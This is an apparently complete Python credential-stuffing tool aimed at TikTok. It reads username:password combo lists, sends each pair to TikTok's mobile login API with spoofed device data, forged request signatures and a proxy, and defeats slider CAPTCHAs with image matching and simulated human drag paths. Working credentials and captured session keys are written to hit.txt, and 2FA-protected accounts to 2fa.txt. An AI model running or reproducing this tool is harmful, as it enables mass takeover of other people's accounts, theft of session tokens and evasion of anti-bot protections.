# code write : @JokerPython3
import requests, random, SignerPy, secrets, os, uuid, json, binascii, time, math
import numpy as np
from io import BytesIO
from PIL import Image, ImageFilter

class CaptchaSolver:
    MODIFIED_IMG_WIDTH = 552

    def __init__(self):
        self._session = requests.Session()

    def _download(self, url):
        resp = self._session.get(url)
        resp.raise_for_status()
        return Image.open(BytesIO(resp.content)).convert("RGBA")

    def _to_grayscale(self, img):
        return np.array(img.convert("L"), dtype=np.float32)

    def _apply_sobel(self, gray):
        kx = np.array([[-1, 0, 1], [-2, 0, 2], [-1, 0, 1]], dtype=np.float32)
        ky = np.array([[-1, -2, -1], [0, 0, 0], [1, 2, 1]], dtype=np.float32)
        pad = 1
        padded = np.pad(gray, pad, mode='edge')
        gx = np.zeros_like(gray)
        gy = np.zeros_like(gray)
        for i in range(gray.shape[0]):
            for j in range(gray.shape[1]):
                region = padded[i:i + 3, j:j + 3]
                gx[i, j] = np.sum(region * kx)
                gy[i, j] = np.sum(region * ky)
        mag = np.hypot(gx, gy)
        mag *= 255.0 / (mag.max() + 1e-6)
        return mag.astype(np.uint8)

    def _edge_map(self, img):
        gray = self._to_grayscale(img)
        blurred = np.array(img.filter(ImageFilter.GaussianBlur(radius=1)).convert("L"), dtype=np.float32)
        edges = self._apply_sobel(blurred)
        thresh = edges.mean()
        return (edges > thresh).astype(np.uint8)

    def _match_template(self, big, small):
        hB, wB = big.shape
        hS, wS = small.shape
        best, best_loc = -1, (0, 0)
        tpl = small - small.mean()
        tpl_norm = np.linalg.norm(tpl)
        for y in range(hB - hS + 1):
            for x in range(wB - wS + 1):
                patch = big[y:y + hS, x:x + wS].astype(np.float32)
                patch -= patch.mean()
                dot = np.sum(patch * tpl)
                norm = np.linalg.norm(patch) * tpl_norm + 1e-6
                score = dot / norm
                if score > best:
                    best, best_loc = score, (x, y)
        return best_loc
#كود معقد كلشي تفكير بيه ناجني
    def _find_offset(self, bg, piece):
        bg_edges = self._edge_map(bg)
        piece_edges = self._edge_map(piece)
        x_off, y_off = self._match_template(bg_edges, piece_edges)
        scale = self.MODIFIED_IMG_WIDTH / bg.width
        drag_width = int(x_off * scale)
        return drag_width, x_off, y_off

    def _save_result(self, bg, piece, offset, path):
        x, y = offset
        bg.paste(piece, (x, y), piece)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        bg.save(path, format="WEBP")

    def _easing(self, t):
        return 1 - (1 - t) ** 4

    def _generate_steps(self, distance, total_time=1.2, steps_count=None):
        if steps_count is None:
            steps_count = max(20, int(30 + distance / 4))
        steps, c, tm = [], 0, 0
        for i in range(steps_count):
            frac = i / (steps_count - 1)
            target = int(self._easing(frac) * distance)
            if target <= c:
                continue
            tm += random.randint(20, 50)
            c = target
            steps.append({"x": c, "y": random.randint(-2, 2), "relative_time": tm})
        tm += random.randint(80, 140)
        steps.append({"x": distance, "y": 0, "relative_time": tm})
        return steps

    def solve(self, res, pic_path="/sdcard/solved.webp"):
        ch = res["data"]["challenges"][0]
        bg = self._download(ch["question"]["url1"])
        piece = self._download(ch["question"]["url2"])
        drag, x, y = self._find_offset(bg, piece)
        self._save_result(bg, piece, (x, y), pic_path)
        path = self._generate_steps(drag, total_time=random.uniform(0.8, 1.5), steps_count=int(20 + drag / 10))
        result = {
            "modified_img_width": self.MODIFIED_IMG_WIDTH,
            "id": ch["id"],
            "mode": ch["mode"],
            "reply": path,
            "models": {},
            "log_params": {},
            "reply2": [],
            "models2": {},
            "drag_width": drag,
            "version": 2,
            "verify_id": res["data"]["verify_id"],
            "verify_requests": [{
                "id": ch["id"],
                "modified_img_width": self.MODIFIED_IMG_WIDTH,
                "drag_width": drag,
                "mode": ch["mode"],
                "reply": path,
                "models": {},
                "reply2": [],
                "models2": {},
                "events": "{\"userMode\":0}"
            }],
            "events": "{\"userMode\":0}"
        }
        return json.dumps(result)

class LoginTikTok:
    hit = 0
    bad = 0
    captch = 0
    agine = 0
    done_captch = 0
    error_captch = 0
    _2fa = 0
    def __init__(self,usernmae,password):
        self.did = '7120973406393058822'
        self.iid = '7514060577799620353'
        #self.proxies={"http or https":"http://proxies or https:// proxies"}
        self.proxies ={'http':'http://3.127.121.101:80'}
        self.__device_id ='7120973406393058822'
        self.__temp = '1749504907301'
        self.__cdid = 'b79c2274-1499-4cf0-a674-f0ffb744794c'
        self.__cookies = {
            "passport_csrf_token": "81bcd272c1c2d5103fd9344755fb9070",
            "passport_csrf_token_default": '81bcd272c1c2d5103fd9344755fb9070',
            'install_id': '7514060577799620353'
        }
        self.__rticket = '1749504918515'
        self.__openuid ='84a10deae01ca4fe'
        self.__ts = '1749504917'
        self.username = usernmae
        self.password = password
        self.version_code = "310503"
        self.version_app = "31.5.3"
        self.session = requests.session()
        self.secret = secrets.token_hex(16)
        self.device_info = "pgJDP6dPgpe6hZqtld52beK1BLX9iTqF40gMOgEMSTQU4VYWIiavfEF_96xND3G5PcgYPxZpW1FcE9etEdS7wFALTJRMd2k0ovF_huEZDgwSqGB-8b2Zff7nHuLXO1iJDlTeIVQnNJzRSQr25jBC8yifDJsbVOkc3KZejx-cI2Q"

    def login(self):

        url = "https://api16-normal-c-alisg.tiktokv.com/passport/user/login/"

        paramss = {
            "passport-sdk-version": "19",
            "iid": self.iid,
            "device_id": self.__device_id,
            "ac": "WIFI",
            "channel": "googleplay",
            "aid": "1233",
            "app_name": "musical_ly",
            "version_code": "310503",
            "version_name": "31.5.3",
            "device_platform": "android",
            "os": "android",
            "ab_version": "31.5.3",
            "ssmix": "a",
            "device_type": "RMX3269",
            "device_brand": "realme",
            "language": "en",
            "os_api": "30",
            "os_version": "11",
            "openudid": self.__openuid,
            "manifest_version_code": "2023105030",
            "resolution": "720*1448",
            "dpi": "320",
            "update_version_code": "2023105030",
            "_rticket": self.__rticket,
            "is_pad": "0",
            "current_region": "IQ",
            "app_type": "normal",
            "mcc_mnc": "41840",
            "timezone_name": "Asia/Baghdad",
            "carrier_region_v2": "418",
            "residence": "IQ",
            "app_language": "en",
            "carrier_region": "IQ",
            "ac2": "unknown",
            "uoo": "0",
            "op_region": "IQ",
            "timezone_offset": "10800",
            "build_number": "31.5.3",
            "app_version": "31.5.3",
            "host_abi": "arm64-v8a",
            "locale": "en",
            "region": "IQ",
            "ts":self.__ts,
            "cdid": self.__cdid,
            "support_webview": "1",
            "cronet_version": "2fdb62f9_2023-09-06",
            "ttnet_version": "4.2.152.11-tiktok",
            "use_store_region_cookie": "1",
            "device_redirect_info": self.device_info

        }



        ks = [hex(ord(c) ^ 5)[2:] for c in self.username]
        user = "".join(ks)
        y = [hex(ord(c) ^ 5)[2:] for c in self.password]
        pas = "".join(y)
        payload = {
            'password': pas,
            'account_sdk_source': "app",
            'multi_login': "1",
            'mix_mode': "1",
            'username': user,
        }



        headerss = {
            'User-Agent': "com.zhiliaoapp.musically/2023105030 (Linux; U; Android 11; ar; RMX3269; Build/RP1A.201005.001; Cronet/TTNetVersion:2fdb62f9 2023-09-06 QuicVersion:bb24d47c 2023-07-19)",

            'x-tt-passport-csrf-token': "81bcd272c1c2d5103fd9344755fb9070",

        }
        signature = SignerPy.sign(params=paramss, payload=payload,cookie=self.__cookies)
        headerss.update({
         'x-ss-req-ticket': signature['x-ss-req-ticket'],
         'x-ss-stub': signature['x-ss-stub'],
            'x-argus': signature["x-argus"],
            'x-gorgon': signature["x-gorgon"],
        'x-khronos': signature["x-khronos"],
         'x-ladon': signature["x-ladon"],
         })

        response = requests.post(url, data=payload, headers=headerss, params=paramss,cookies=self.__cookies,proxies=self.proxies) #,proxies=self.proxies
        print(response.json())
        if 'Drag slider to verify' in response.text:
            LoginTikTok.captch +=1
            print(
                f"Hit : {LoginTikTok.hit} | Bad : {LoginTikTok.bad} | captch: {LoginTikTok.captch} | error_captch : {LoginTikTok.error_captch} | try agine : {LoginTikTok.agine} | 2fa : {LoginTikTok._2fa} | done captch : {LoginTikTok.done_captch}")

            h = response.json()['data']['verify_center_decision_conf']
            l = json.loads(h)

            de = l["detail"]
            sev = l['server_sdk_env']
            self.__get_captch(de,sev)
            return
        elif 'Maximum number of attempts reached. Try again later.' in response.text:
            self.agine += 1
            print(
                f"Hit : {LoginTikTok.hit} | Bad : {LoginTikTok.bad} | captch: {LoginTikTok.captch} | error_captch : {LoginTikTok.error_captch} | try agine : {LoginTikTok.agine} | 2fa : {LoginTikTok._2fa} | done captch : {LoginTikTok.done_captch}")

            return
        elif  "Account doesn't exist" in response.text or "Username or password doesn't match our records. Try again." in response.text:
            LoginTikTok.bad +=1
            print(
                f"Hit : {LoginTikTok.hit} | Bad : {LoginTikTok.bad} | captch: {LoginTikTok.captch} | error_captch : {LoginTikTok.error_captch} | try agine : {LoginTikTok.agine} | 2fa : {LoginTikTok._2fa} | done captch : {LoginTikTok.done_captch}")
            return
        elif 'verify_ticket' in response.text:
            LoginTikTok._2fa +=1
            print(response.cookies.get_dict())
            print(
                f"Hit : {LoginTikTok.hit} | Bad : {LoginTikTok.bad} | captch: {LoginTikTok.captch} | error_captch : {LoginTikTok.error_captch} | try agine : {LoginTikTok.agine} | 2fa : {LoginTikTok._2fa} | done captch : {LoginTikTok.done_captch}")
            with open("2fa.txt","a") as f:
                f.write(f"username: {self.username} | password : {self.password} | status : 2fa \n")

            return
        elif 'session_key' in response.text:
            LoginTikTok.hit += 1
            sessionid = requests.json()['data']['session_key']
            print(
                f"Hit : {LoginTikTok.hit} | Bad : {LoginTikTok.bad} | captch: {LoginTikTok.captch} | error_captch : {LoginTikTok.error_captch} | try agine : {LoginTikTok.agine} | 2fa : {LoginTikTok._2fa} | done captch : {LoginTikTok.done_captch}")

            with open("hit.txt","a") as f:
                f.write(f"username: {self.username} | password : {self.password} | sessionid : {sessionid} | status : hit \n")
            return
        else:
            with open("js.txt","a",encoding="utf-8") as f:
                f.write(response.text)
            return


    def __get_captch(self,de,sev):
        time.sleep(1)

        url = "https://rc-verification16-normal-no1a.tiktokv.eu/captcha/get"
        params = {

            "lang": "en",
            "app_name": "musical_ly",
            "h5_sdk_version": "2.33.11",#12
            "h5_sdk_use_type": "cdn",
            "sdk_version": "2.3.3.i18n",
            "iid": self.iid,
            "did": self.__device_id,
            "device_id": self.__device_id,
            "ch": "googleplay",
            "aid": "1233",
            "os_type": "0",
            "mode": "slide",
            "tmp": self.__temp,
            "platform": "app",
            "webdriver": "false",
            "verify_host": "https://rc-verification16-normal-no1a.tiktokv.eu/",
            "locale": "en",
            "channel": "googleplay",
            "app_key": "",
            "vc": "31.5.3",
            "app_version": "31.5.3",
            "session_id": "",
            "region": "no1a",
            "use_native_report": "1",
            "use_jsb_request": "1",
            "orientation": "2",
            "resolution": "720*1448",
            "os_version": "30",
            "device_brand": "realme",
            "device_model": "RMX3269",
            "os_name": "Android",
            "version_code": "3153",
            "device_type": "RMX3269",
            "device_platform": "Android",
            "type": "verify",
            "detail": de,
            "server_sdk_env": sev,
            "imagex_domain": "",
            "subtype": "slide",
            "challenge_code": "99999",
            "verify_id": "Verify_beebe1f4-1d5a-4dae-a12e-805a28225384",
            "triggered_region": "no1a",
            "cookie_enabled": "true",
            "screen_width": "360",
            "screen_height": "800",
            "browser_language": "en",
            "browser_platform": "Linux aarch64",
            "browser_name": "Mozilla",
            "browser_version": "5.0 (Linux; Android 11; RMX3269 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/136.0.7103.127 Mobile Safari/537.36 BytedanceWebview/d8a21c6",
            "device_redirect_info": self.device_info
            }

        headers = {
            'User-Agent': "com.zhiliaoapp.musically/2023105030 (Linux; U; Android 11; ar; RMX3269; Build/RP1A.201005.001; Cronet/TTNetVersion:2fdb62f9 2023-09-06 QuicVersion:bb24d47c 2023-07-19)",

            'content-type': "application/json; charset=utf-8",

        }

        signature = SignerPy.sign(params=params,cookie=self.__cookies)

        headers.update({
             'x-ss-req-ticket': signature['x-ss-req-ticket'],
             'x-ss-stub': signature['x-ss-stub'],
                'x-argus': signature["x-argus"],
                'x-gorgon': signature["x-gorgon"],
            'x-khronos': signature["x-khronos"],
             'x-ladon': signature["x-ladon"],
             })

        res = requests.get(url, headers=headers, params=params,cookies=self.__cookies,proxies=self.proxies).json()  #,proxies=self.proxies
        #print(res)
        try:


                verify_id = res["data"]["verify_id"]
                params.update({"verify_id": verify_id, 'mode': res["data"]["challenges"][0]['mode'],
                               'subtype': res["data"]["challenges"][0]['mode'],
                               "challenge_code": res["data"]["challenges"][0]["challenge_code"]})
                self.solver(res,de,sev)
                return
        except Exception as e:

                return
    def solver(self,res,de,sev):
        time.sleep(1)

        cap = CaptchaSolver().solve(res)

        try:


            url = "https://rc-verification16-normal-no1a.tiktokv.eu/captcha/verify"
            params = {
                "lang": "en",
                "app_name": "musical_ly",
                "h5_sdk_version": "2.33.12",
                "h5_sdk_use_type": "cdn",
                "sdk_version": "2.3.3.i18n",
                "iid": self.iid,
                "did": self.did,
                "device_id": self.__device_id,
                "ch": "googleplay",
                "aid": "1233",
                "os_type": "0",
                "mode": res["data"]["challenges"][0]["mode"],
                "tmp": self.__temp,
                "platform": "app",
                "webdriver": "false",
                "verify_host": "https://rc-verification16-normal-no1a.tiktokv.eu/",
                "locale": "en",
                "channel": "googleplay",
                "app_key": "",
                "vc": self.version_app,
                "app_version": self.version_app,
                "session_id": "",
                "region": "no1a",
                "use_native_report": "1",
                "use_jsb_request": "1",
                "orientation": "2",
                "resolution": "720*1448",
                "os_version": "30",
                "device_brand": "realme",
                "device_model": "RMX3269",
                "os_name": "Android",
                "version_code": self.version_code,
                "device_type": "RMX3269",
                "device_platform": "Android",
                "type": "verify",
                "detail": de,
                "server_sdk_env": sev,
                "imagex_domain": "",
                "subtype":"",
                "challenge_code": res["data"]["challenges"][0]["challenge_code"],
                "verify_id": res["data"]["verify_id"],
                "triggered_region": "no1a",
                "cookie_enabled": "true",
                "screen_width": "360",
                "screen_height": "800",
                "browser_language": "en",
                "browser_platform": "Linux aarch64",
                "browser_name": "Mozilla",
                "browser_version": "5.0 (Linux; Android 11; RMX3269 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/136.0.7103.127 Mobile Safari/537.36 BytedanceWebview/d8a21c6",
                "device_redirect_info": self.device_info
            }
            headers = {
                'User-Agent': "com.zhiliaoapp.musically/2023105030 (Linux; U; Android 11; ar; RMX3269; Build/RP1A.201005.001; Cronet/TTNetVersion:2fdb62f9 2023-09-06 QuicVersion:bb24d47c 2023-07-19)",
                'Content-Type': "application/json",
                'content-type': "application/json; charset=utf-8",
            }
            signature = SignerPy.sign(params=params,cookie=self.__cookies)

            headers.update({
             'x-ss-req-ticket': signature['x-ss-req-ticket'],
             'x-ss-stub': signature['x-ss-stub'],
                'x-argus': signature["x-argus"],
                'x-gorgon': signature["x-gorgon"],
            'x-khronos': signature["x-khronos"],
             'x-ladon': signature["x-ladon"],
             })

            response = self.session.post(url, data=cap, headers=headers, params=params,cookies=self.__cookies,proxies=self.proxies)#,proxies=self.proxies

            #print(response.json())
            if 'Verification complete' in response.text:

                #self.login()
#اذا تريد تكرر فحص للحساب امسح تعليق من self.login يعني يضل يفحص حتى يتاكد بل اخير تحياتي لمام نترو
                LoginTikTok.done_captch +=1
                print(
                    f"Hit : {LoginTikTok.hit} | Bad : {LoginTikTok.bad} | captch: {LoginTikTok.captch} | error_captch : {LoginTikTok.error_captch} | try agine : {LoginTikTok.agine} | 2fa : {LoginTikTok._2fa} | done captch : {LoginTikTok.done_captch}")

            else:
                LoginTikTok.error_captch+=1
                print(
                f"Hit : {LoginTikTok.hit} | Bad : {LoginTikTok.bad} | captch: {LoginTikTok.captch} | error_captch : {LoginTikTok.error_captch} | try agine : {LoginTikTok.agine} | 2fa : {LoginTikTok._2fa} | done captch : {LoginTikTok.done_captch}")

        except Exception as e:
            #print(e)
            LoginTikTok.captch +=1
            print(
                f"Hit : {LoginTikTok.hit} | Bad : {LoginTikTok.bad} | captch: {LoginTikTok.captch} | error_captch : {LoginTikTok.error_captch} | try agine : {LoginTikTok.agine} | 2fa : {LoginTikTok._2fa} | done captch : {LoginTikTok.done_captch}")
    @staticmethod
    def start():
        check = set()

        with open("combo.txt", "r") as ksj:
            u = ksj.read().splitlines()

        for date in u:
            if date in check:
                continue
            check.add(date)

            try:
                username = date.split(":")[0]
                password = date.split(":")[1]
            except:
                continue

            #print(username)
            #print(password)
            LoginTikTok(username, password).login()
LoginTikTok.start()
#join my channel : https://t.me/python3_Tool
# check = set()
#
# with open("combo.txt", "r") as ksj:
#     u = ksj.read().splitlines()
#
# for date in u:
#     if date in check:
#         continue
#     check.add(date)
#
#     try:
#         username = date.split(":")[0]
#         password = date.split(":")[1]
#     except:
#         continue
#
#     print(username)
#     print(password)
#     LoginTikTok(username, password).login()
